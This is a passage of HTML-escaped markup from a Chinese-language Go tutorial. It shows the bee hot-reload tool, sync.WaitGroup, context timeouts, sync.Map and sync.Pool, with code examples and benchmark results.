t;&lt;span&gt;&lt;strong&gt;&lt;span&gt;减少缓存穿透利器之singleflight包的使用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Channel的使用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;单元测试&amp;amp;基准测试&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;性能分析&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 data-line=&quot;678&quot;&gt;&lt;span&gt;1. 热加载工具bee&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;680&quot;&gt;&lt;p data-line=&quot;680&quot;&gt;&lt;span&gt;作用：以热加载方式运行Go代码，会监视代码的变动重新运行代码，提高开发效率。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;682&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;683&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;安装&lt;br/&gt;&lt;/span&gt;&lt;span&gt;go get github.com/beego/bee/v2&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;热加载方式启动项目&lt;br/&gt;&lt;/span&gt;&lt;span&gt;SOAAGENT=10.40.24.126 bee run -main=main.go -runargs=&quot;start&quot;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;691&quot;&gt;&lt;span&gt;2. Goroutine并发控制之&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.WaitGroup&lt;/span&gt;&lt;/code&gt;&lt;span&gt;包的使用&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;693&quot;&gt;&lt;p data-line=&quot;693&quot;&gt;&lt;span&gt;作用：Goroutine可以等待，直到当前Goroutine派生的子Goroutine执行完成。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;695&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;696&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;time&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;wg := &amp;amp;sync.WaitGroup{}&lt;br/&gt;&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(wg *sync.WaitGroup)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;子a 开始执行&quot;&lt;/span&gt;)&lt;br/&gt;time.Sleep(&lt;span&gt;5&lt;/span&gt; * time.Second)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;子a 执行完毕&quot;&lt;/span&gt;)&lt;br/&gt;}(wg)&lt;br/&gt;&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(wg *sync.WaitGroup)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;子b 开始执行&quot;&lt;/span&gt;)&lt;br/&gt;time.Sleep(&lt;span&gt;5&lt;/span&gt; * time.Second)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;子b 执行完毕&quot;&lt;/span&gt;)&lt;br/&gt;}(wg)&lt;br/&gt;&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(wg *sync.WaitGroup)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;子c 开始执行&quot;&lt;/span&gt;)&lt;br/&gt;time.Sleep(&lt;span&gt;5&lt;/span&gt; * time.Second)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;子c 执行完毕&quot;&lt;/span&gt;)&lt;br/&gt;}(wg)&lt;br/&gt;&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;主 等待&quot;&lt;/span&gt;)&lt;br/&gt;wg.Wait()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;主 退出&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 第一次执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子a 开始执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子c 开始执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子b 开始执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 主 等待 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------&lt;/span&gt;&lt;span&gt;&lt;span&gt; 注意这里和下面打印的位置不一样，因为当前代码并发执行是没有保障执行顺序的&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子b 执行完毕&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子a 执行完毕&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子c 执行完毕&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 主 退出&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 第一次执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 主 等待 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------&lt;/span&gt;&lt;span&gt;&lt;span&gt; 注意这里和上面打印的位置不一样，因为当前代码并发执行是没有保障执行顺序的&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子a 开始执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子c 开始执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子b 开始执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子b 执行完毕&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子c 执行完毕&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 子a 执行完毕&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 主 退出 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------&lt;/span&gt;&lt;span&gt; 主Goroutine一直等待直到子Goroutine都执行完毕&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;760&quot;&gt;&lt;span&gt;3. 子Goroutine超时控制之&lt;/span&gt;&lt;code&gt;&lt;span&gt;context.Context&lt;/span&gt;&lt;/code&gt;&lt;span&gt;包的使用&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;762&quot;&gt;&lt;p data-line=&quot;762&quot;&gt;&lt;span&gt;作用：Go语言第一形参通常都为context.Context类型，1. 传递上下文 2. 控制子Goroutine超时退出 3. 控制子Goroutine定时退出&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;764&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;765&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;context&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;time&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;ctx, cancel := context.WithTimeout(context.TODO(), &lt;span&gt;5&lt;/span&gt;*time.Second)&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; cancel()&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(ctx context.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;execResult := &lt;span&gt;make&lt;/span&gt;(&lt;span&gt;chan&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;// 模拟业务逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(execResult &lt;span&gt;chan&lt;/span&gt;&amp;lt;- &lt;span&gt;bool&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 模拟处理超时&lt;/span&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;6&lt;/span&gt; * time.Second)&lt;br/&gt;execResult &amp;lt;- &lt;span&gt;true&lt;/span&gt;&lt;br/&gt;}(execResult)&lt;br/&gt;&lt;span&gt;// 等待结果&lt;/span&gt;&lt;br/&gt;&lt;span&gt;select&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; &amp;lt;-ctx.Done():&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;超时退出&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; &amp;lt;-execResult:&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;处理完成&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;}(ctx)&lt;br/&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;10&lt;/span&gt; * time.Second)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 超时退出&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;803&quot;&gt;&lt;span&gt;4. 并发安全的map之&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.Map&lt;/span&gt;&lt;/code&gt;&lt;span&gt;包的使用&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;805&quot;&gt;&lt;p data-line=&quot;805&quot;&gt;&lt;span&gt;作用：并发安全的map，支持并发写。读多写少场景的性能好。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;807&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;808&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;b&quot;&lt;/span&gt;, &lt;span&gt;&quot;b&quot;&lt;/span&gt;)&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;aa&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo-4    6334993       203.8 ns/op      16 B/op       1 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 没有panic&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;833&quot;&gt;&lt;span&gt;5. 减少GC压力之&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.Pool&lt;/span&gt;&lt;/code&gt;&lt;span&gt;包的使用&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;835&quot;&gt;&lt;p data-line=&quot;835&quot;&gt;&lt;span&gt;作用：复用对象，减少垃圾回收GC压力。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;837&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;837&quot;&gt;&lt;span&gt;5.1  不使用sync.Pool代码示例&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;840&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Country &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Province &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; City &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; County &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Street &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟数据&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 地址信息对象&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; AddressModule &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;Consignee       &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;consignee&quot;`&lt;/span&gt;&lt;br/&gt;Email           &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;email&quot;`&lt;/span&gt;&lt;br/&gt;Mobile          &lt;span&gt;int64&lt;/span&gt;     &lt;span&gt;`json:&quot;mobile&quot;`&lt;/span&gt;&lt;br/&gt;Country         *Country  &lt;span&gt;`json:&quot;country&quot;`&lt;/span&gt;&lt;br/&gt;Province        *Province &lt;span&gt;`json:&quot;province&quot;`&lt;/span&gt;&lt;br/&gt;City            *City     &lt;span&gt;`json:&quot;city&quot;`&lt;/span&gt;&lt;br/&gt;County          *County   &lt;span&gt;`json:&quot;county&quot;`&lt;/span&gt;&lt;br/&gt;Street          *Street   &lt;span&gt;`json:&quot;street&quot;`&lt;/span&gt;&lt;br/&gt;DetailedAddress &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;detailed_address&quot;`&lt;/span&gt;&lt;br/&gt;PostalCode      &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;postal_code&quot;`&lt;/span&gt;&lt;br/&gt;AddressID       &lt;span&gt;int64&lt;/span&gt;     &lt;span&gt;`json:&quot;address_id&quot;`&lt;/span&gt;&lt;br/&gt;IsDefault       &lt;span&gt;bool&lt;/span&gt;      &lt;span&gt;`json:&quot;is_default&quot;`&lt;/span&gt;&lt;br/&gt;Label           &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;label&quot;`&lt;/span&gt;&lt;br/&gt;Longitude       &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;longitude&quot;`&lt;/span&gt;&lt;br/&gt;Latitude        &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;latitude&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 不使用sync.Pool&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo_NoPool&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;&lt;span&gt;// 直接初始化&lt;/span&gt;&lt;br/&gt;addressModule := &amp;amp;AddressModule{}&lt;br/&gt;addressModule.Consignee = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Email = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Mobile = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Country = &amp;amp;Country{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.Province = &amp;amp;Province{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.City = &amp;amp;City{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.County = &amp;amp;County{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.Street = &amp;amp;Street{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.DetailedAddress = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.PostalCode = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.IsDefault = &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;addressModule.Label = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Longitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Latitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 下面这段代码没意义 只是为了不报语法错误&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; addressModule == &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 不使用sync.Pool执行结果&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// cpu: Intel(R) Core(TM) i5-7360U CPU @ 2.30GHz&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo_NoPool-4   144146564        84.62 ns/op     120 B/op       5 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo21.782s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h5&gt;&lt;span&gt;不使用sync.Pool执行分析：火焰图&amp;amp;Top函数&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;span&gt;可以很明显看见GC过程消耗了大量的CPU:&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.30925925925925923&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeMBU933JdGRib5kSSYiaG7YxxoCGtkrv2iaSd6genWSCm3t8TsIuqqnJLQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.5703703703703704&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMekDCMRT5SQaC0TlLFRToE57r0xeglrErmO46TXOSQdb5OyR9Fec9nnA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h2 data-line=&quot;950&quot;&gt;&lt;span&gt;5.2 使用sync.Pool代码示例&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;951&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// 使用sync.Pool&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo_Pool&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 使用缓存池sync.Pool&lt;/span&gt;&lt;br/&gt;demoPool := &amp;amp;sync.Pool{&lt;br/&gt;&lt;span&gt;// 定义初始化结构体的匿名函数&lt;/span&gt;&lt;br/&gt;New: &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;/span&gt;{} {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &amp;amp;AddressModule{&lt;br/&gt;Country: &amp;amp;Country{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;Province: &amp;amp;Province{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;City: &amp;amp;City{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;County: &amp;amp;County{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;Street: &amp;amp;Street{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;}&lt;br/&gt;},&lt;br/&gt;}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;&lt;span&gt;// 从缓存池中获取对象&lt;/span&gt;&lt;br/&gt;addressModule, _ := (demoPool.Get()).(*AddressModule)&lt;br/&gt;&lt;span&gt;// 下面这段代码没意义 只是为了不报语法错误&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; addressModule == &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 重置对象 准备归还对象到缓存池&lt;/span&gt;&lt;br/&gt;addressModule.Consignee = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Email = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Mobile = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Country.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Country.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Province.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Province.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.County.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.County.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Street.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Street.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.DetailedAddress = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.PostalCode = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.IsDefault = &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;addressModule.Label = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Longitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Latitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 还对象到缓存池&lt;/span&gt;&lt;br/&gt;demoPool.Put(addressModule)&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 使用sync.Pool执行结果&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// cpu: Intel(R) Core(TM) i5-7360U CPU @ 2.30GHz&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo_Pool-4   988550808        12.41 ns/op       0 B/op       0 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  